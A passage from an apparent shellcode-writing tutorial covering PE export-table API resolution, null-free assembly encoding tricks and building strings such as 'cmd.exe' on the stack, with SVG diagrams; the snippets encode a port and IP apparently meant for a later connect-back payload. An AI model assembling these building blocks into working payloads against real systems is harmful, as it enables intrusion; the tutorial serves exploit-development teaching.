  <text x="375" y="25" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s205)" font-weight="bold">PE Export Table: Three-Array Cross-Reference</text>
  <rect x="250" y="42" width="250" height="60" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="375" y="62" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">IMAGE_EXPORT_DIRECTORY</text>
  <text x="375" y="78" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x18] NumberOfNames   [+0x1C] AddrOfFunctions</text>
  <text x="375" y="92" text-anchor="middle" fill="#e0e7ff" font-size="10">[+0x20] AddrOfNames   [+0x24] AddrOfNameOrdinals</text>
  <text x="100" y="128" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">AddressOfNames</text>
  <rect x="30" y="152" width="140" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="100" y="171" text-anchor="middle" fill="#e0e7ff" font-size="11">[0] "AddAtomA"</text>
  <rect x="30" y="183" width="140" height="28" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1"/>
  <text x="100" y="202" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
  <rect x="30" y="214" width="140" height="28" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="100" y="233" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">[n] "LoadLibraryA"</text>
  <text x="375" y="128" text-anchor="middle" fill="#ff6b35" font-size="12" font-weight="bold">AddressOfNameOrdinals</text>
  <rect x="305" y="152" width="140" height="28" rx="3" fill="#151b28" stroke="#ff6b35" stroke-width="1"/>
  <text x="375" y="171" text-anchor="middle" fill="#e0e7ff" font-size="11">[0] ordinal: 2</text>
  <rect x="305" y="183" width="140" height="28" rx="3" fill="#151b28" stroke="#ff6b35" stroke-width="1"/>
  <text x="375" y="202" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
  <rect x="305" y="214" width="140" height="28" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="375" y="233" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">[n] ordinal: 831</text>
  <text x="640" y="128" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">AddressOfFunctions</text>
  <rect x="570" y="152" width="140" height="28" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1"/>
  <text x="640" y="171" text-anchor="middle" fill="#e0e7ff" font-size="11">[0] RVA 0x01A2F0</text>
  <rect x="570" y="183" width="140" height="28" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1"/>
  <text x="640" y="202" text-anchor="middle" fill="#8b949e" font-size="11">...</text>
  <rect x="570" y="214" width="140" height="28" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="640" y="233" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">[831] RVA 0x15C40</text>
  <line x1="170" y1="228" x2="305" y2="228" stroke="#ff3366" stroke-width="2" marker-end="url(#arwR)"/>
  <rect x="198" y="209" width="95" height="18" rx="5" fill="#0d1117"/>
  <text x="245" y="223" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">Step 1: index n</text>
  <line x1="445" y1="228" x2="570" y2="228" stroke="#ff3366" stroke-width="2" marker-end="url(#arwR)"/>
  <rect x="460" y="209" width="100" height="18" rx="5" fill="#0d1117"/>
  <text x="510" y="223" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">Step 2: ord 831</text>
  <rect x="180" y="290" width="390" height="60" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="375" y="313" text-anchor="middle" fill="#00ff88" font-size="13" font-weight="bold">Resolution Complete</text>
  <text x="375" y="333" text-anchor="middle" fill="#e0e7ff" font-size="11">Function RVA + DLL Base Address = Final Virtual Address</text>
  <text x="375" y="348" text-anchor="middle" fill="#ff3366" font-size="12">EAX = kernel32_base + AddressOfFunctions[831]</text>
  <line x1="640" y1="242" x2="560" y2="300" stroke="#00ff88" stroke-width="1.5" stroke-dasharray="5,3" marker-end="url(#arwG)"/>
</svg></div>

*Figure 4.2 - The PE Export Table uses three parallel arrays. We hash each name in AddressOfNames until we find a match, use that same index to read the ordinal from AddressOfNameOrdinals, then use the ordinal as an index into AddressOfFunctions to get the function's RVA.*

These three capabilities -- skeleton, PEB walk, and API resolution -- are the foundation for everything that follows. Before we write our first payload, though, we need a toolkit of building-block techniques.

---

## 5. Null-Free Encoding Patterns

The single hardest constraint in shellcode writing is not size or complexity -- it is **bad characters**. The most common offender is `0x00`, the null byte. Here is a catalog of the patterns we will use throughout this series.

### Pattern 1: XOR Zeroing

Instead of `mov eax, 0` (which assembles as `B8 00 00 00 00`), we write:

```nasm
xor   eax, eax             ; EAX = 0, assembles as 31 C0 (two bytes, no nulls)
```

### Pattern 2: Two's Complement (ADD Instead of SUB)

```nasm
; Instead of: sub esp, 0x610  (contains null bytes)
add   esp, 0xfffff9f0       ; Same result: ESP - 0x610
```

The formula: `two's_complement(X) = NOT(X) + 1`.

<div align="center"><svg viewBox="0 0 750 280" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s103" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s103"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s103" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="280" rx="10" fill="url(#bg_s103)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s103)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s103)" font-weight="bold">Two's Complement: 0x610 to 0xFFFFF9F0</text>
  <rect x="40" y="55" width="150" height="50" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="115" y="76" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">0x00000610</text>
  <text x="115" y="96" text-anchor="middle" fill="#8b949e" font-size="10">Original (has nulls!)</text>
  <line x1="195" y1="80" x2="238" y2="80" stroke="#00ff88" stroke-width="2"/>
  <polygon points="235,74 245,80 235,86" fill="#00ff88"/>
  <text x="220" y="70" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">NOT</text>
  <rect x="250" y="55" width="170" height="50" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="335" y="76" text-anchor="middle" fill="#ff6b35" font-size="13" font-weight="bold">0xFFFFF9EF</text>
  <text x="335" y="96" text-anchor="middle" fill="#8b949e" font-size="10">All bits flipped</text>
  <line x1="425" y1="80" x2="468" y2="80" stroke="#00ff88" stroke-width="2"/>
  <polygon points="465,74 475,80 465,86" fill="#00ff88"/>
  <text x="450" y="70" text-anchor="middle" fill="#00ff88" font-size="10" font-weight="bold">+ 1</text>
  <rect x="480" y="55" width="230" height="50" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="595" y="76" text-anchor="middle" fill="#00ff88" font-size="13" font-weight="bold">0xFFFFF9F0</text>
  <text x="595" y="96" text-anchor="middle" fill="#e0e7ff" font-size="10">No null bytes!</text>
  <text x="375" y="135" text-anchor="middle" fill="#00d4ff" font-size="12" font-weight="bold">Bit-Level View (all 32 bits)</text>
  <text x="50" y="160" fill="#ff3366" font-size="11" font-weight="bold">0x0610:</text>
  <rect x="140" y="147" width="560" height="22" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="1"/>
  <text x="420" y="163" text-anchor="middle" fill="#e0e7ff" font-size="10">0000 0000 0000 0000 0000 0110 0001 0000</text>
  <text x="50" y="195" fill="#ff6b35" font-size="11" font-weight="bold">NOT:</text>
  <rect x="140" y="182" width="560" height="22" rx="3" fill="#151b28" stroke="#ff6b35" stroke-width="1"/>
  <text x="420" y="198" text-anchor="middle" fill="#ff6b35" font-size="10">1111 1111 1111 1111 1111 1001 1110 1111</text>
  <text x="50" y="230" fill="#00ff88" font-size="11" font-weight="bold">+1:</text>
  <rect x="140" y="217" width="560" height="22" rx="3" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="420" y="233" text-anchor="middle" fill="#00ff88" font-size="10">1111 1111 1111 1111 1111 1001 1111 0000</text>
  <text x="375" y="265" text-anchor="middle" fill="#e0e7ff" font-size="11">add esp, 0xFFFFF9F0 produces the same effect as sub esp, 0x610</text>
</svg></div>

### Pattern 3: NOT Encoding

```nasm
; We need 0x00000100 (STARTF_USESTDHANDLES) -- full of nulls
push  0xfffffeff            ; NOT(0x00000100) = 0xFFFFFEFF
pop   eax
not   eax                   ; EAX = 0x00000100
push  eax
```

### Pattern 4: NEG for Small Byte Values

```nasm
mov   al, 0xFA              ; 0x100 - 0x06 = 0xFA (allowed)
neg   al                    ; AL = 0x06
```

### Pattern 5: INC/DEC Chains

```nasm
xor   eax, eax              ; EAX = 0
inc   eax                   ; EAX = 1
inc   eax                   ; EAX = 2 (AF_INET)
```

### Pattern 6: Shift-Based Construction

```nasm
xor   eax, eax              ; EAX = 0x00000000
mov   al, 0xBB              ; EAX = 0x000000BB
shl   eax, 0x08             ; EAX = 0x0000BB00
inc   eax                   ; EAX = 0x0000BB01 (port 443 in NBO)
```

<div align="center"><svg viewBox="0 0 750 310" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s104" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s104"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s104" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="310" rx="10" fill="url(#bg_s104)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s104)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s104)" font-weight="bold">SHL Chain: Building Port 443 (0xBB01) Byte-by-Byte</text>
  <!-- Step 1 -->
  <text x="40" y="62" fill="#00ff88" font-size="12" font-weight="bold">Step 1: xor eax, eax</text>
  <rect x="280" y="48" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="310" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="345" y="48" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="375" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="410" y="48" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="440" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="475" y="48" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="505" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <text x="580" y="67" fill="#8b949e" font-size="10">= 0x00000000</text>
  <!-- Step 2 -->
  <text x="40" y="112" fill="#00ff88" font-size="12" font-weight="bold">Step 2: mov al, 0xBB</text>
  <rect x="280" y="98" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="310" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="345" y="98" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="375" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="410" y="98" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="440" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="475" y="98" width="60" height="28" rx="6" fill="#ff6b35" stroke-width="2"/>
  <text x="505" y="117" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">BB</text>
  <text x="580" y="117" fill="#ff6b35" font-size="10">AL = 0xBB</text>
  <!-- Shift arrow -->
  <text x="160" y="160" fill="#00d4ff" font-size="11" font-weight="bold">SHL 8: byte slides left one position</text>
  <line x1="505" y1="130" x2="440" y2="148" stroke="#00d4ff" stroke-width="2" stroke-dasharray="4,3"/>
  <polygon points="443,144 437,152 447,150" fill="#00d4ff"/>
  <!-- Step 3 -->
  <text x="40" y="192" fill="#00ff88" font-size="12" font-weight="bold">Step 3: shl eax, 0x08</text>
  <rect x="280" y="178" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="310" y="197" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="345" y="178" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="375" y="197" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="410" y="178" width="60" height="28" rx="6" fill="#ff6b35" stroke-width="2"/>
  <text x="440" y="197" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">BB</text>
  <rect x="475" y="178" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="505" y="197" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <text x="580" y="197" fill="#ff6b35" font-size="10">= 0x0000BB00</text>
  <!-- Step 4 -->
  <text x="40" y="242" fill="#00ff88" font-size="12" font-weight="bold">Step 4: inc eax</text>
  <rect x="280" y="228" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="310" y="247" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="345" y="228" width="60" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="375" y="247" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="410" y="228" width="60" height="28" rx="6" fill="#ff6b35" stroke-width="2"/>
  <text x="440" y="247" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">BB</text>
  <rect x="475" y="228" width="60" height="28" rx="6" fill="#00ff88" stroke-width="2"/>
  <text x="505" y="247" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">01</text>
  <text x="580" y="247" fill="#00ff88" font-size="10" font-weight="bold">= 0x0000BB01</text>
  <!-- Result -->
  <rect x="180" y="270" width="390" height="28" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="375" y="289" text-anchor="middle" fill="#00ff88" font-size="12">Port 443 in network byte order -- zero null bytes in opcodes</text>
</svg></div>

### Pattern 7: XOR with a Key

```nasm
mov   eax, 0x5551F890       ; Encoded value
xor   eax, 0x50505050       ; Key
; Result: 0x0501A8C0 = 192.168.1.5 in little-endian
```

<div align="center"><svg viewBox="0 0 750 400" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s105" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s105"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s105" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="400" rx="10" fill="url(#bg_s105)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s105)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s105)" font-weight="bold">Null-Free Encoding Cheat Sheet</text>
  <!-- Row 1 -->
  <rect x="20" y="48" width="225" height="48" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="30" y="66" fill="#00ff88" font-size="11" font-weight="bold">1. XOR Zero</text>
  <text x="30" y="86" fill="#e0e7ff" font-size="10">mov eax,0 --> xor eax,eax</text>
  <rect x="260" y="48" width="225" height="48" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="270" y="66" fill="#00d4ff" font-size="11" font-weight="bold">2. Two's Complement</text>
  <text x="270" y="86" fill="#e0e7ff" font-size="10">sub 0x610 --> add 0xFFFFF9F0</text>
  <rect x="500" y="48" width="230" height="48" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="510" y="66" fill="#ff3366" font-size="11" font-weight="bold">3. NOT Encoding</text>
  <text x="510" y="86" fill="#e0e7ff" font-size="10">push NOT(val); pop; not</text>
  <!-- Row 2 -->
  <rect x="20" y="108" width="225" height="48" rx="5" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="30" y="126" fill="#ff6b35" font-size="11" font-weight="bold">4. NEG Byte</text>
  <text x="30" y="146" fill="#e0e7ff" font-size="10">mov al,0xFA; neg al = 0x06</text>
  <rect x="260" y="108" width="225" height="48" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="270" y="126" fill="#00ff88" font-size="11" font-weight="bold">5. INC/DEC Chain</text>
  <text x="270" y="146" fill="#e0e7ff" font-size="10">xor eax,eax; inc; inc = 2</text>
  <rect x="500" y="108" width="230" height="48" rx="5" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="510" y="126" fill="#00d4ff" font-size="11" font-weight="bold">6. SHL Build</text>
  <text x="510" y="146" fill="#e0e7ff" font-size="10">mov al,X; shl; mov al,Y</text>
  <!-- Row 3 centered -->
  <rect x="260" y="168" width="225" height="48" rx="5" fill="#151b28" stroke="#ff3366" stroke-width="1.5"/>
  <text x="270" y="186" fill="#ff3366" font-size="11" font-weight="bold">7. XOR Key</text>
  <text x="270" y="206" fill="#e0e7ff" font-size="10">mov eax,encoded; xor eax,key</text>
  <!-- Concrete example -->
  <rect x="40" y="238" width="670" height="140" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="375" y="260" text-anchor="middle" fill="#ff6b35" font-size="13" font-weight="bold">Example: Building 0x00000100 (STARTF_USESTDHANDLES)</text>
  <text x="60" y="285" fill="#8b949e" font-size="11">Need: 0x00000100</text>
  <text x="280" y="285" fill="#ff3366" font-size="11">Problem: three null bytes</text>
  <text x="60" y="310" fill="#00ff88" font-size="11">Solution (NOT): push 0xFFFFFEFF; pop eax; not eax</text>
  <text x="60" y="335" fill="#00d4ff" font-size="11">Solution (SHL): xor eax,eax; inc eax; shl eax, 8</text>
  <text x="60" y="360" fill="#e0e7ff" font-size="11">Both produce 0x00000100 with zero null bytes in the assembled opcodes</text>
</svg></div>

> These patterns are composable. A single value might require a shift, a NOT, and an INC. The more patterns you internalize, the faster you can adapt to any bad character set.

---

## 6. Building Strings on the Stack

Shellcode needs strings constantly: DLL names, command lines, file paths, registry keys. Every string must be constructed at runtime on the stack.

### The DWORD Push Pattern

Break the string into 4-byte chunks, convert each to a little-endian DWORD, and push them in reverse order. Let us build `"cmd.exe"`:

```
String:      c    m    d    .    e    x    e    \0
ASCII hex:   63   6d   64   2e   65   78   65   00
```

Group into DWORDs:

```
DWORD 1: "cmd." = 0x2e646d63
DWORD 2: "exe\0" = 0x00657865  (contains null!)
```

<div align="center"><svg viewBox="0 0 750 320" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s206" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s206"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s206" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
    <marker id="str-arr" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0,0 8,3 0,6" fill="#00ff88"/></marker>
    <linearGradient id="bg_s206" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s206"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s206" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="320" rx="10" fill="url(#bg_s206)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s206)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s206)" font-weight="bold">Building "cmd.exe" on the Stack</text>
  <!-- Step 1 -->
  <text x="40" y="58" fill="#00ff88" font-size="12" font-weight="bold">Step 1:</text>
  <text x="110" y="58" fill="#e0e7ff" font-size="12">xor eax, eax</text>
  <text x="350" y="58" fill="#8b949e" font-size="10">EAX = 0x00000000</text>
  <!-- Step 2 -->
  <text x="40" y="83" fill="#00ff88" font-size="12" font-weight="bold">Step 2:</text>
  <text x="110" y="83" fill="#e0e7ff" font-size="12">mov eax, 0x657865</text>
  <text x="350" y="83" fill="#8b949e" font-size="10">EAX = 0x00657865 = "exe\0" (high byte stays zero!)</text>
  <!-- Step 3 -->
  <text x="40" y="108" fill="#00ff88" font-size="12" font-weight="bold">Step 3:</text>
  <text x="110" y="108" fill="#e0e7ff" font-size="12">push eax</text>
  <text x="350" y="108" fill="#8b949e" font-size="10">Push "exe\0" onto stack</text>
  <!-- Step 4 -->
  <text x="40" y="133" fill="#00ff88" font-size="12" font-weight="bold">Step 4:</text>
  <text x="110" y="133" fill="#e0e7ff" font-size="12">push 0x2e646d63</text>
  <text x="350" y="133" fill="#8b949e" font-size="10">Push "cmd." onto stack</text>
  <!-- Stack memory layout -->
  <text x="375" y="168" text-anchor="middle" fill="#ff6b35" font-size="13" font-weight="bold">Stack Memory (after pushes)</text>
  <!-- Memory bytes -->
  <rect x="100" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="125" y="195" text-anchor="middle" fill="#e0e7ff" font-size="13">63</text>
  <text x="125" y="212" text-anchor="middle" fill="#00ff88" font-size="9">'c'</text>
  <rect x="155" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="180" y="195" text-anchor="middle" fill="#e0e7ff" font-size="13">6d</text>
  <text x="180" y="212" text-anchor="middle" fill="#00ff88" font-size="9">'m'</text>
  <rect x="210" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="235" y="195" text-anchor="middle" fill="#e0e7ff" font-size="13">64</text>
  <text x="235" y="212" text-anchor="middle" fill="#00ff88" font-size="9">'d'</text>
  <rect x="265" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="290" y="195" text-anchor="middle" fill="#e0e7ff" font-size="13">2e</text>
  <text x="290" y="212" text-anchor="middle" fill="#00ff88" font-size="9">'.'</text>
  <rect x="320" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="345" y="195" text-anchor="middle" fill="#e0e7ff" font-size="13">65</text>
  <text x="345" y="212" text-anchor="middle" fill="#00ff88" font-size="9">'e'</text>
  <rect x="375" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="400" y="195" text-anchor="middle" fill="#e0e7ff" font-size="13">78</text>
  <text x="400" y="212" text-anchor="middle" fill="#00ff88" font-size="9">'x'</text>
  <rect x="430" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="455" y="195" text-anchor="middle" fill="#e0e7ff" font-size="13">65</text>
  <text x="455" y="212" text-anchor="middle" fill="#00ff88" font-size="9">'e'</text>
  <rect x="485" y="178" width="50" height="38" rx="3" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="510" y="195" text-anchor="middle" fill="#ff3366" font-size="13" font-weight="bold">00</text>
  <text x="510" y="212" text-anchor="middle" fill="#ff3366" font-size="9">'\0'</text>
  <!-- Labels -->
  <line x1="100" y1="225" x2="315" y2="225" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="207" y="245" text-anchor="middle" fill="#ff6b35" font-size="10">push 0x2e646d63 ("cmd.")</text>
  <line x1="320" y1="225" x2="535" y2="225" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="427" y="245" text-anchor="middle" fill="#ff6b35" font-size="10">push 0x00657865 ("exe\0")</text>
  <!-- ESP pointer -->
  <text x="60" y="198" fill="#ff3366" font-size="11">ESP--></text>
  <text x="570" y="198" fill="#8b949e" font-size="10">Higher addr --></text>
  <!-- Final -->
  <rect x="100" y="262" width="540" height="40" rx="5" fill="#151b28" stroke="#00ff88" stroke-width="1.5"/>
  <text x="370" y="278" text-anchor="middle" fill="#00ff88" font-size="12" font-weight="bold">mov esi, esp</text>
  <text x="370" y="295" text-anchor="middle" fill="#e0e7ff" font-size="11">ESI now points to "cmd.exe\0" -- ready for WinExec or CreateProcessA</text>
</svg></div>

Fix with zero-extend:

```nasm
xor   eax, eax              ; EAX = 0x00000000
mov   eax, 0x657865         ; EAX = 0x00657865 (high byte stays zero)
push  eax                   ; Push "exe\0"
push  0x2e646d63            ; Push "cmd."
mov   esi, esp              ; ESI -> "cmd.exe\0"
```

### The SHL/MOV AL Trick

```nasm
xor   eax, eax              ; EAX = 0
mov   ax, 0x6c6c            ; AX = "ll"
shl   eax, 0x08             ; EAX = 0x006c6c00
mov   al, 0x64              ; AL = 'd' -> EAX = 0x006c6c64 = "dll\0"
push  eax
```

This builds `"dll\0"` byte by byte. We will see this pattern repeatedly when building DLL name strings.

<div align="center"><svg viewBox="0 0 750 340" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s106" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s106"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s106" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="340" rx="10" fill="url(#bg_s106)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s106)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s106)" font-weight="bold">SHL/MOV AL Trick: Building "dll\0" in EAX</text>
  <!-- Step 1 -->
  <text x="40" y="62" fill="#00ff88" font-size="12" font-weight="bold">Step 1: xor eax, eax</text>
  <rect x="300" y="48" width="48" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="324" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="353" y="48" width="48" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="377" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="406" y="48" width="48" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="430" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="459" y="48" width="48" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="483" y="67" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <text x="540" y="67" fill="#8b949e" font-size="10">EAX = 0</text>
  <!-- Step 2 -->
  <text x="40" y="112" fill="#00ff88" font-size="12" font-weight="bold">Step 2: mov ax, 0x6c6c</text>
  <rect x="300" y="98" width="48" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="324" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="353" y="98" width="48" height="28" rx="6" fill="#151b28" stroke="#8b949e" stroke-width="1.5"/>
  <text x="377" y="117" text-anchor="middle" fill="#8b949e" font-size="12">00</text>
  <rect x="406" y="98" width="48" height="28" rx="6" fill="#00d4ff" stroke-width="2"/>
  <text x="430" y="117" text-anchor="middle" fill="#0d1117" font-size="12" font-weight="bold">6c</text>
